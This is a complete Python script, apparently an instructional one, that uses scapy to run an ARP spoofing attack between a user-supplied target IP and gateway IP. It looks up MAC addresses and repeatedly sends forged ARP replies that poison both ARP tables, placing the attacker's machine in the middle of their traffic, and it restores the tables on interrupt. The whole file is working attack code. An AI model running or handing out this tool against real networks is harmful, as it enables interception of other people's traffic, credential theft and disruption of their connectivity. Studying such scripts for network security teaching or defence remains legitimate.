import scapy.all as scp
import time
import sys
import os

target_ip = input("Enter target IP: ")
gateway_ip = input("Enter gateway IP: ")


def get_mac(ip):
    arp_packet = scp.ARP(pdst=ip, op=1)
    # default op value for ARP packet is 1, which is op=who-has
    broadcast_packet = scp.Ether(dst="ff:ff:ff:ff:ff:ff")  # mac address for broadcast
    arp_broadcast_packet = broadcast_packet / arp_packet
    answered_list = scp.srp(arp_broadcast_packet, verbose=False)
    # srp sends packet and waits for an answer and collects the packet, sorts as an tuple in the format (Answered, Unanswered)
    # the reply of the ARP packet replies with a packet that contains the mac address of the pdst
    return answered_list[0][0][1].hwsrc


def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scp.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
    )  # without hwsrc argument, it will default to our mac address
    scp.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scp.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )  # setting the hwsrc back to its correct mac address
    scp.send(packet, count=4, verbose=False)  # sending 4 packets in case of packet loss


sent_packets = 0
try:
    while True:

        # we want to mess up both the gateway's and the target's ARP table

        # changing target's ARP table to change gateway ip to attacker's mac adress
        arp_spoof(target_ip, gateway_ip)
        # changing gateway's ARP table change target ip to attacker's mac address
        arp_spoof(gateway_ip, target_ip)

        sent_packets += 2

        sys.stdout.write("\rSent packets: " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\nRestoring ARP Tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
